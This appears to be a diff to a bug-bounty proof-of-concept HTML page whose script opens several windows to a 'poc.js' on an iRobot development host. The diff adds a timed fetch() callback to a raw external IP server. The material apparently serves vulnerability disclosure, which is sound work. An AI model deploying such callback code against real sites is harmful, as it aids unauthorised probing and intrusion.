@@ -7,6 +7,7 @@ hello_ltidi_from_h1
   <script>
     function openTwoWindows() {
       var url = "https://services-dev.irobot.com/poc.js";
+      var server = "http://170.64.186.216:8000";
 
       // Open the first window
       var window1 = window.open(url, "_blank");
@@ -35,6 +36,10 @@ hello_ltidi_from_h1
       setTimeout(function() {
         var window7 = window.open(url, "_blank");
       }, 12000);
+
+      setTimeout(function() {
+        fetch(server, "_blank");
+      }, 13000);
     }
   </script>
 </head>
